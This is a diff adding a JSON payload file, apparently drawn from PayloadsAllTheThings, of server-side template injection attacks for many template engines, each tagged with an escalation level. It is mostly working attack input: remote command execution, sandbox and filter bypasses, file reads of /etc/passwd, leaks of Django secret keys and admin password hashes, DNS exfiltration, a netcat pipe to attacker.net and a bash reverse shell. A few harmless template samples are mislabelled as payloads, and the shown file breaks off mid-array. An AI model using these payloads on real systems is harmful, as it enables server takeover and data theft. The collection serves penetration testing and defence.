@@ -1,0 +1,915 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "ssti",
+  "original_category": "Server Side Template Injection",
+  "payloads": [
+    {
+      "category": "ASP.NET Razor - Basic Injection",
+      "escalation": "baseline",
+      "lines": [
+        "@(1+2)"
+      ]
+    },
+    {
+      "category": "ASP.NET Razor - Command Execution",
+      "escalation": "baseline",
+      "lines": [
+        "@{",
+        "// C# code",
+        "}"
+      ]
+    },
+    {
+      "category": "Universal Payloads",
+      "escalation": "baseline",
+      "lines": [
+        "elem(System.shell(\"id\"), 0) # Rendered RCE",
+        "[1, 2][elem(System.shell(\"id\"), 0)] # Error-Based RCE",
+        "1/((elem(System.shell(\"id\"), 1) == 0)&&1||0) # Boolean-Based RCE",
+        "elem(System.shell(\"id && sleep 5\"), 0) # Time-Based RCE"
+      ]
+    },
+    {
+      "category": "EEx - Basic injections",
+      "escalation": "baseline",
+      "lines": [
+        "<%= 7 * 7 %>"
+      ]
+    },
+    {
+      "category": "EEx - Retrieve /etc/passwd",
+      "escalation": "baseline",
+      "lines": [
+        "<%= File.read!(\"/etc/passwd\") %>"
+      ]
+    },
+    {
+      "category": "EEx - Remote Command execution",
+      "escalation": "baseline",
+      "lines": [
+        "<%= elem(System.shell(\"id\"), 0) %> # Rendered RCE",
+        "<%= [1, 2][elem(System.shell(\"id\"), 0)] %> # Error-Based RCE",
+        "<%= 1/((elem(System.shell(\"id\"), 1) == 0)&&1||0) %> # Boolean-Based RCE",
+        "<%= elem(System.shell(\"id && sleep 5\"), 0) %> # Time-Based RCE"
+      ]
+    },
+    {
+      "category": "Java EL - Basic Injection",
+      "escalation": "baseline",
+      "lines": [
+        "${7*7}",
+        "${{7*7}}",
+        "${class.getClassLoader()}",
+        "${class.getResource(\"\").getPath()}",
+        "${class.getResource(\"../../../../../index.htm\").getContent()}"
+      ]
+    },
+    {
+      "category": "Java EL - Code Execution",
+      "escalation": "baseline",
+      "lines": [
+        "${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())} // Rendered RCE",
+        "${''.getClass().forName('java.lang.Integer').valueOf('x'+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))} // Error-Based RCE",
+        "${1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+''} // Boolean-Based RCE",
+        "${(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor().equals(0)?(''.getClass().forName('java.lang.Thread')).sleep(5000):0).toString()} // Time-Based RCE"
+      ]
+    },
+    {
+      "category": "Freemarker - Read File",
+      "escalation": "baseline",
+      "lines": [
+        "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(\" \")}",
+        "Convert the returned bytes to ASCII"
+      ]
+    },
+    {
+      "category": "Freemarker - Code Execution",
+      "escalation": "baseline",
+      "lines": [
+        "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")}",
+        "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}",
+        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+        "[=\"freemarker.template.utility.Execute\"?new()(\"id\")]",
+        "${(\"xx\"+(\"freemarker.template.utility.Execute\"?new()(\"id\")))?new()} // Error-Based RCE",
+        "${1/((freemarker.template.utility.Execute\"?new()(\" … && echo UniqueString\")?chop_linebreak?ends_with(\"UniqueString\"))?string('1','0')?eval)} // Boolean-Based RCE",
+        "${\"freemarker.template.utility.Execute\"?new()(\"id && sleep 5\")} // Time-Based RCE"
+      ]
+    },
+    {
+      "category": "Freemarker - Code Execution with Obfuscation",
+      "escalation": "baseline",
+      "lines": [
+        "${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}"
+      ]
+    },
+    {
+      "category": "Freemarker - Sandbox Bypass",
+      "escalation": "aggressive",
+      "lines": [
+        "<#assign classloader=article.class.protectionDomain.classLoader>",
+        "<#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")>",
+        "<#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)>",
+        "<#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>",
+        "${dwf.newInstance(ec,null)(\"id\")}"
+      ]
+    },
+    {
+      "category": "Jinjava - Basic Injection",
+      "escalation": "aggressive",
+      "lines": [
+        "{{'a'.toUpperCase()}} would result in 'A'",
+        "{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206"
+      ]
+    },
+    {
+      "category": "Jinjava - Command Execution",
+      "escalation": "aggressive",
+      "lines": [
+        "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"new java.lang.String('xxx')\\\")}}",
+        "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"whoami\\\\\\\"); x.start()\\\")}}",
+        "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"netstat\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}",
+        "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"uname\\\\\\\",\\\\\\\"-a\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}"
+      ]
+    },
+    {
+      "category": "Pebble - Basic Injection",
+      "escalation": "aggressive",
+      "lines": [
+        "{{ someString.toUPPERCASE() }}"
+      ]
+    },
+    {
+      "category": "Pebble - Code Execution",
+      "escalation": "aggressive",
+      "lines": [
+        "{% set cmd = 'id' %}",
+        "{% set bytes = (1).TYPE",
+        ".forName('java.lang.Runtime')",
+        ".methods[6]",
+        ".invoke(null,null)",
+        ".exec(cmd)",
+        ".inputStream",
+        ".readAllBytes() %}",
+        "{{ (1).TYPE",
+        ".forName('java.lang.String')",
+        ".constructors[0]",
+        ".newInstance(([bytes]).toArray()) }}"
+      ]
+    },
+    {
+      "category": "Velocity",
+      "escalation": "aggressive",
+      "lines": [
+        "$ex.waitFor()",
+        "$str.valueOf($chr.toChars($out.read()))",
+        "#set($output = $scanner.next().trim())",
+        "$output.replaceAll(\"\\\\s+$\", \"\").replaceAll(\"^\\\\s+\", \"\")"
+      ]
+    },
+    {
+      "category": "Groovy - Read File",
+      "escalation": "aggressive",
+      "lines": [
+        "${String x = new File('c:/windows/notepad.exe').text}",
+        "${String x = new File('/path/to/file').getText('UTF-8')}",
+        "${new File(\"C:\\Temp\\FileName.txt\").createNewFile();}"
+      ]
+    },
+    {
+      "category": "Groovy - HTTP Request",
+      "escalation": "aggressive",
+      "lines": [
+        "${\"http://www.google.com\".toURL().text}",
+        "${new URL(\"http://www.google.com\").getText()}"
+      ]
+    },
+    {
+      "category": "Groovy - Command Execution",
+      "escalation": "aggressive",
+      "lines": [
+        "${\"calc.exe\".exec()}",
+        "${\"calc.exe\".execute()}",
+        "${this.evaluate(\"9*9\") //(this is a Script class)}",
+        "${new org.codehaus.groovy.runtime.MethodClosure(\"calc.exe\",\"execute\").call()}"
+      ]
+    },
+    {
+      "category": "Groovy - Command Execution with Obfuscation",
+      "escalation": "aggressive",
+      "lines": [
+        "${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}"
+      ]
+    },
+    {
+      "category": "Groovy - Sandbox Bypass",
+      "escalation": "aggressive",
+      "lines": [
+        "${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"whoami\")})",
+        "def x }",
+        "${ new groovy.lang.GroovyClassLoader().parseClass(\"@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\")})def x\") }"
+      ]
+    },
+    {
+      "category": "SpEL - Basic Injection",
+      "escalation": "aggressive",
+      "lines": [
+        "${7*7}",
+        "${'patt'.toString().replace('a', 'x')}",
+        "${T(java.lang.Integer).valueOf('1')}"
+      ]
+    },
+    {
+      "category": "SpEL - Retrieve Environment Variables",
+      "escalation": "aggressive",
+      "lines": [
+        "${T(java.lang.System).getenv()}"
+      ]
+    },
+    {
+      "category": "SpEL - Retrieve /etc/passwd",
+      "escalation": "aggressive",
+      "lines": [
+        "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}"
+      ]
+    },
+    {
+      "category": "SpEL - DNS Exfiltration",
+      "escalation": "aggressive",
+      "lines": [
+        "${\"\".getClass().forName(\"java.net.InetAddress\").getMethod(\"getByName\",\"\".getClass()).invoke(\"\",\"xxxxxxxxxxxxxx.burpcollaborator.net\")}"
+      ]
+    },
+    {
+      "category": "SpEL - Session Attributes",
+      "escalation": "aggressive",
+      "lines": [
+        "${pageContext.request.getSession().setAttribute(\"admin\",true)}"
+      ]
+    },
+    {
+      "category": "OGNL - Basic Injection",
+      "escalation": "aggressive",
+      "lines": [
+        "7*7",
+        "'patt'.toString().replace('a', 'x')",
+        "@java.lang.Integer@valueOf('1')"
+      ]
+    },
+    {
+      "category": "OGNL - Command Execution",
+      "escalation": "aggressive",
+      "lines": [
+        "new String(@java.lang.Runtime@getRuntime().exec(\"id\").getInputStream().readAllBytes())",
+        "(new String(@java.lang.Runtime@getRuntime().exec(\"id\").getInputStream().readAllBytes()))/0",
+        "1/((@java.lang.Runtime@getRuntime().exec(\"id\").waitFor()==0)?1:0)+\"\"",
+        "((@java.lang.Runtime@getRuntime().exec(\"id\").waitFor().equals(0))?@java.lang.Thread@sleep(5000):0)"
+      ]
+    },
+    {
+      "category": "Universal Payloads",
+      "escalation": "baseline",
+      "lines": [
+        "// Rendered RCE",
+        "global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()",
+        "// Error-Based RCE",
+        "global.process.mainModule.require(\"Y:/A:/\"+global.process.mainModule.require(\"child_process\").execSync(\"id\").toString())",
+        "\"\"[\"x\"][global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()]",
+        "// Boolean-Based RCE",
+        "[\"\"][0 + !(global.process.mainModule.require(\"child_process\").spawnSync(\"id\", options={shell:true}).status===0)][\"length\"]",
+        "// Time-Based RCE",
+        "global.process.mainModule.require(\"child_process\").execSync(\"id && sleep 5\").toString()"
+      ]
+    },
+    {
+      "category": "Handlebars - Basic Injection",
+      "escalation": "baseline",
+      "lines": [
+        "{{this}}",
+        "{{self}}"
+      ]
+    },
+    {
+      "category": "Handlebars - Command Execution",
+      "escalation": "baseline",
+      "lines": [
+        "{{#with \"s\" as |string|}}",
+        "{{#with \"e\"}}",
+        "{{#with split as |conslist|}}",
+        "{{this.pop}}",
+        "{{this.push (lookup string.sub \"constructor\")}}",
+        "{{this.pop}}",
+        "{{#with string.split as |codelist|}}",
+        "{{this.pop}}",
+        "{{this.push \"return require('child_process').execSync('ls -la');\"}}",
+        "{{this.pop}}",
+        "{{#each conslist}}",
+        "{{#with (string.sub.apply 0 codelist)}}",
+        "{{this}}",
+        "{{/with}}",
+        "{{/each}}",
+        "{{/with}}",
+        "{{/with}}",
+        "{{/with}}",
+        "{{/with}}"
+      ]
+    },
+    {
+      "category": "Lodash - Basic Injection",
+      "escalation": "baseline",
+      "lines": [
+        "const _ = require('lodash');",
+        "string = \"{{= username}}\"",
+        "const options = {",
+        "evaluate: /\\{\\{(.+?)\\}\\}/g,",
+        "interpolate: /\\{\\{=(.+?)\\}\\}/g,",
+        "escape: /\\{\\{-(.+?)\\}\\}/g,",
+        "};",
+        "_.template(string, options);",
+        "{{= _.VERSION}}",
+        "${= _.VERSION}",
+        "<%= _.VERSION %>",
+        "{{= _.templateSettings.evaluate }}",
+        "${= _.VERSION}",
+        "<%= _.VERSION %>"
+      ]
+    },
+    {
+      "category": "Lodash - Command Execution",
+      "escalation": "baseline",
+      "lines": [
+        "{{x=Object}}{{w=a=new x}}{{w.type=\"pipe\"}}{{w.readable=1}}{{w.writable=1}}{{a.file=\"/bin/sh\"}}{{a.args=[\"/bin/sh\",\"-c\",\"id;ls\"]}}{{a.stdio=[w,w]}}{{process.binding(\"spawn_sync\").spawn(a).output}}"
+      ]
+    },
+    {
+      "category": "Pug",
+      "escalation": "baseline",
+      "lines": [
+        "- var x = root.process",
+        "- x = x.mainModule.require",
+        "- x = x('child_process')",
+        "= x.exec('id | nc attacker.net 80')"
+      ]
+    },
+    {
+      "category": "Universal Payloads",
+      "escalation": "baseline",
+      "lines": [
+        "// Rendered RCE",
+        "shell_exec('id')",
+        "system('id')",
+        "// Error-Based RCE",
+        "ini_set(\"error_reporting\", \"1\") // Enable verbose fatal errors for Error-Based",
+        "call_user_func(join(\"\", [\"xx\", shell_exec('id')]))",
+        "// Boolean-Based RCE",
+        "1 / (pclose(popen(\"id\", \"wb\")) == 0)",
+        "// Time-Based RCE",
+        "shell_exec('id && sleep 5')",
+        "system('id && sleep 5')"
+      ]
+    },
+    {
+      "category": "Blade",
+      "escalation": "baseline",
+      "lines": [
+        "{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}"
+      ]
+    },
+    {
+      "category": "Smarty",
+      "escalation": "baseline",
+      "lines": [
+        "{$smarty.version}",
+        "{php}echo `id`;{/php} //deprecated in smarty v3",
+        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
+        "{system('ls')} // compatible v3, deprecated in v5",
+        "{system('cat index.php')} // compatible v3, deprecated in v5"
+      ]
+    },
+    {
+      "category": "Smarty - Code Execution with Obfuscation",
+      "escalation": "baseline",
+      "lines": [
+        "{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}"
+      ]
+    },
+    {
+      "category": "Twig - Basic Injection",
+      "escalation": "baseline",
+      "lines": [
+        "{{7*7}}",
+        "{{7*'7'}} would result in 49",
+        "{{dump(app)}}",
+        "{{dump(_context)}}",
+        "{{app.request.server.all|join(',')}}"
+      ]
+    },
+    {
+      "category": "Twig - Template Format",
+      "escalation": "baseline",
+      "lines": [
+        "$output = $twig > render (",
+        "'Dear' . $_GET['custom_greeting'],",
+        "array(\"first_name\" => $user.first_name)",
+        ");",
+        "$output = $twig > render (",
+        "\"Dear {first_name}\",",
+        "array(\"first_name\" => $user.first_name)",
+        ");"
+      ]
+    },
+    {
+      "category": "Twig - Arbitrary File Reading",
+      "escalation": "baseline",
+      "lines": [
+        "\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@",
+        "{{include(\"wp-config.php\")}}"
+      ]
+    },
+    {
+      "category": "Twig - Code Execution",
+      "escalation": "baseline",
+      "lines": [
+        "{{self}}",
+        "{{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}}",
+        "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
+        "{{['id']|filter('system')}}",
+        "{{[0]|reduce('system','id')}}",
+        "{{['id']|map('system')|join}}",
+        "{{['id',1]|sort('system')|join}}",
+        "{{['cat\\x20/etc/passwd']|filter('system')}}",
+        "{{['cat$IFS/etc/passwd']|filter('system')}}",
+        "{{['id']|filter('passthru')}}",
+        "{{['id']|map('passthru')}}",
+        "{{['nslookup oastify.com']|filter('system')}}",
+        "{% for a in [\"error_reporting\", \"1\"]|sort(\"ini_set\") %}{% endfor %} // Enable verbose error output for Error-Based",
+        "{{_self.env.registerUndefinedFilterCallback(\"shell_exec\")}}{%include [\"Y:/A:/\", _self.env.getFilter(\"id\")]|join%} // Error-Based RCE <= 1.19",
+        "{{[0]|map([\"xx\", {\"id\": \"shell_exec\"}|map(\"call_user_func\")|join]|join)}} // Error-Based RCE >=1.41, >=2.10, >=3.0",
+        "{{_self.env.registerUndefinedFilterCallback(\"shell_exec\")}}{{1/(_self.env.getFilter(\"id && echo UniqueString\")|trim('\\n') ends with \"UniqueString\")}} // Boolean-Based RCE <= 1.19",
+        "{{1/({\"id && echo UniqueString\":\"shell_exec\"}|map(\"call_user_func\")|join|trim('\\n') ends with \"UniqueString\")}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0",
+        "{% set a = [\"error_reporting\", \"1\"]|sort(\"ini_set\") %}{% set b = [\"ob_start\", \"call_user_func\"]|sort(\"call_user_func\") %}{{ [\"id\", 0]|sort(\"system\") }}{% set a = [\"ob_end_flush\", []]|sort(\"call_user_func_array\")%} // Error-Based RCE with sandbox bypass using CVE-2022-23614",
+        "{{ 1 / ([\"id >>/dev/null && echo -n 1\", \"0\"]|sort(\"system\")|first == \"0\") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614",
+        "{{ {'id':'shell_exec'}|map('call_user_func')|join }}",
+        "FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}",
+        "POST /subscribe?0=cat+/etc/passwd HTTP/1.1",
+        "email=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"@attacker.tld"
+      ]
+    },
+    {
+      "category": "Twig - Code Execution with Obfuscation",
+      "escalation": "baseline",
+      "lines": [
+        "{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}",
+        "{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}"
+      ]
+    },
+    {
+      "category": "Latte - Basic Injection",
+      "escalation": "baseline",
+      "lines": [
+        "{var $X=\"POC\"}{$X}"
+      ]
+    },
+    {
+      "category": "Latte - Code Execution",
+      "escalation": "baseline",
+      "lines": [
+        "{php system('nslookup oastify.com')}"
+      ]
+    },
+    {
+      "category": "patTemplate",
+      "escalation": "baseline",
+      "lines": [
+        "<patTemplate:tmpl name=\"page\">",
+        "This is the main page.",
+        "<patTemplate:tmpl name=\"foo\">",
+        "It contains another template.",
+        "</patTemplate:tmpl>",
+        "<patTemplate:tmpl name=\"hello\">",
+        "Hello {NAME}.<br/>",
+        "</patTemplate:tmpl>",
+        "</patTemplate:tmpl>"
+      ]
+    },
+    {
+      "category": "PHPlib and HTML_Template_PHPLIB",
+      "escalation": "baseline",
+      "lines": [
+        "<html>",
+        "<head><title>{PAGE_TITLE}</title></head>",
+        "<body>",
+        "<table>",
+        "<caption>Authors</caption>",
+        "<thead>",
+        "<tr><th>Name</th><th>Email</th></tr>",
+        "</thead>",
+        "<tfoot>",
+        "<tr><td colspan=\"2\">{NUM_AUTHORS}</td></tr>",
+        "</tfoot>",
+        "<tbody>",
+        "<!-- BEGIN authorline -->",
+        "<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>",
+        "<!-- END authorline -->",
+        "</tbody>",
+        "</table>",
+        "</body>",
+        "</html>",
+        "<?php",
+        "//we want to display this author list",
+        "$authors = array(",
+        "'Christian Weiske'  => 'cweiske@php.net',",
+        "'Bjoern Schotte'     => 'schotte@mayflower.de'",
+        ");",
+        "require_once 'HTML/Template/PHPLIB.php';",
+        "//create template object",
+        "$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');",
+        "//load file",
+        "$t->setFile('authors', 'authors.tpl');",
+        "//set block",
+        "$t->setBlock('authors', 'authorline', 'authorline_ref');",
+        "//set some variables",
+        "$t->setVar('NUM_AUTHORS', count($authors));",
+        "$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));",
+        "//display the authors",
+        "foreach ($authors as $name => $email) {",
+        "$t->setVar('AUTHOR_NAME', $name);",
+        "$t->setVar('AUTHOR_EMAIL', $email);",
+        "$t->parse('authorline_ref', 'authorline', true);",
+        "}",
+        "//finish and echo",
+        "echo $t->finish($t->parse('OUT', 'authors'));",
+        "?>"
+      ]
+    },
+    {
+      "category": "Plates",
+      "escalation": "baseline",
+      "lines": [
+        "// Create new Plates instance",
+        "$templates = new League\\Plates\\Engine('/path/to/templates');",
+        "// Render a template",
+        "echo $templates->render('profile', ['name' => 'Jonathan']);",
+        "<?php $this->layout('template', ['title' => 'User Profile']) ?>",
+        "<h1>User Profile</h1>",
+        "<p>Hello, <?=$this->e($name)?></p>",
+        "<html>",
+        "<head>",
+        "<title><?=$this->e($title)?></title>",
+        "</head>",
+        "<body>",
+        "<?=$this->section('content')?>",
+        "</body>",
+        "</html>"
+      ]
+    },
+    {
+      "category": "Universal Payloads",
+      "escalation": "baseline",
+      "lines": [
+        "__include__(\"os\").popen(\"id\").read() # Rendered RCE",
+        "getattr(\"\", \"x\" + __include__(\"os\").popen(\"id\").read()) # Error-Based RCE",
+        "1 / (__include__(\"os\").popen(\"id\")._proc.wait() == 0) # Boolean-Based RCE",
+        "__include__(\"os\").popen(\"id && sleep 5\").read() # Time-Based RCE"
+      ]
+    },
+    {
+      "category": "Django - Basic Injection",
+      "escalation": "baseline",
+      "lines": [
+        "{% csrf_token %} # Causes error with Jinja2",
+        "{{ 7*7 }}  # Error with Django Templates",
+        "ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r"
+      ]
+    },
+    {
+      "category": "Django - Cross-Site Scripting",
+      "escalation": "baseline",
+      "lines": [
+        "{{ '<script>alert(3)</script>' }}",
+        "{{ '<script>alert(3)</script>' | safe }}"
+      ]
+    },
+    {
+      "category": "Django - Debug Information Leak",
+      "escalation": "baseline",
+      "lines": [
+        "{% debug %}"
+      ]
+    },
+    {
+      "category": "Django - Leaking App's Secret Key",
+      "escalation": "baseline",
+      "lines": [
+        "{{ messages.storages.0.signer.key }}"
+      ]
+    },
+    {
+      "category": "Django - Admin Site URL leak",
+      "escalation": "baseline",
+      "lines": [
+        "{% include 'admin/base.html' %}"
+      ]
+    },
+    {
+      "category": "Django - Admin Username And Password Hash Leak",
+      "escalation": "baseline",
+      "lines": [
+        "{% load log %}{% get_admin_log 10 as log %}{% for e in log %}",
+        "{{e.user.get_username}} : {{e.user.password}}{% endfor %}",
+        "{% get_admin_log 10 as admin_log for_user user %}"
+      ]
+    },
+    {
+      "category": "Jinja2 - Basic Injection",
+      "escalation": "baseline",
+      "lines": [
+        "{{4*4}}[[5*5]]",
+        "{{7*'7'}} would result in 7777777",
+        "{{config.items()}}"
+      ]
+    },
+    {
+      "category": "Jinja2 - Template Format",
+      "escalation": "baseline",
+      "lines": [
+        "{% extends \"layout.html\" %}",
+        "{% block body %}",
+        "<ul>",
+        "{% for user in users %}",
+        "<li><a href=\"{{ user.url }}\">{{ user.username }}</a></li>",
+        "{% endfor %}",
+        "</ul>",
+        "{% endblock %}"
+      ]
+    },
+    {
+      "category": "Jinja2 - Debug Statement",
+      "escalation": "baseline",
+      "lines": [
+        "<pre>{% debug %}</pre>"
+      ]
+    },
+    {
+      "category": "Jinja2 - Dump All Used Classes",
+      "escalation": "baseline",
+      "lines": [
+        "{{ [].class.base.subclasses() }}",
+        "{{''.class.mro()[1].subclasses()}}",
+        "{{ ''.__class__.__mro__[2].__subclasses__() }}",
+        "{{ self.__init__.__globals__.__builtins__ }}"
+      ]
+    },
+    {
+      "category": "Jinja2 - Dump All Config Variables",
+      "escalation": "baseline",
+      "lines": [
+        "{% for key, value in config.iteritems() %}",
+        "<dt>{{ key|e }}</dt>",
+        "<dd>{{ value|e }}</dd>",
+        "{% endfor %}"
+      ]
+    },
+    {
+      "category": "Jinja2 - Read Remote File",
+      "escalation": "baseline",
+      "lines": [
+        "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
+        "{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"/tmp/flag\").read() }}",
+        "{{ get_flashed_messages.__globals__.__builtins__.open(\"/etc/passwd\").read() }}"
+      ]
+    },
+    {
+      "category": "Jinja2 - Write Into Remote File",
+      "escalation": "baseline",
+      "lines": [
+        "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}"
+      ]
+    },
+    {
+      "category": "Jinja2 - Remote Command Execution",
+      "escalation": "baseline",
+      "lines": [
+        "nc -lnvp 8000",
+        "{{",
+        "x.__init__.__builtins__.exec(\"from flask import current_app, after_this_request",
+        "@after_this_request",
+        "def hook(*args, **kwargs):",
+        "from flask import make_response",
+        "r = make_response('Powned')",
+        "return r",
+        "\")",
+        "}}",
+        "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
+        "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
+        "{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}",
+        "{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}",
+        "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
+        "{{ joiner.__init__.__globals__.os.popen('id').read() }}",
+        "{{ namespace.__init__.__globals__.os.popen('id').read() }}",
+        "{{ cycler.__init__.__globals__.__builtins__.getattr(\"\", \"x\" + cycler.__init__.__globals__.os.popen('id').read()) }} # Error-Based",
+        "{{ 1 / (cycler.__init__.__globals__.os.popen(\"id\")._proc.wait() == 0) }} # Boolean-Based",
+        "{{ lipsum.__globals__[\"os\"].popen('id').read() }}",
+        "{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}",
+        "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
+        "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ip\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/cat\\\", \\\"flag.txt\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}",
+        "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",
+        "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }}",
+        "{{ config.from_pyfile('/tmp/evilconfig.cfg') }}",
+        "{{ config['RUNCMD']('/bin/bash -c \"/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1\"',shell=True) }}"
+      ]
+    },
+    {
+      "category": "Jinja2 - Remote Command Execution with Obfuscation",
+      "escalation": "baseline",
+      "lines": [
+        "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}"
+      ]
+    },
+    {
+      "category": "Jinja2 - Filter Bypass",
+      "escalation": "aggressive",
+      "lines": [
+        "request.__class__",
+        "request[\"__class__\"]",
+        "http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_",
+        "{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}",
+        "{{request|attr([\"_\"*2,\"class\",\"_\"*2]|join)}}",
+        "{{request|attr([\"__\",\"class\",\"__\"]|join)}}",
+        "{{request|attr(\"__class__\")}}",
+        "{{request.__class__}}",
+        "http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_",
+        "or",
+        "http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_",
+        "http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_",
+        "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}"
+      ]
+    },
+    {
+      "category": "Tornado - Basic Injection",
+      "escalation": "aggressive",
+      "lines": [
+        "{{7*7}}",
+        "{{7*'7'}}"
+      ]
+    },
+    {
+      "category": "Tornado - Remote Command Execution",
+      "escalation": "aggressive",
+      "lines": [
+        "{{os.system('whoami')}}",
+        "{%import os%}{{os.system('nslookup oastify.com')}}"
+      ]
+    },
+    {
+      "category": "Mako",
+      "escalation": "aggressive",
+      "lines": [
+        "<%",
+        "import os",
+        "x=os.popen('id').read()",
+        "%>",
+        "${x}"
+      ]
+    },
+    {
+      "category": "Mako - Remote Command Execution",
+      "escalation": "aggressive",
+      "lines": [
+        "${self.module.cache.util.os.system(\"id\")}",
+        "${self.module.runtime.util.os.system(\"id\")}",
+        "${self.template.module.cache.util.os.system(\"id\")}",
+        "${self.module.cache.compat.inspect.os.system(\"id\")}",
+        "${self.__init__.__globals__['util'].os.system('id')}",
+        "${self.template.module.runtime.util.os.system(\"id\")}",
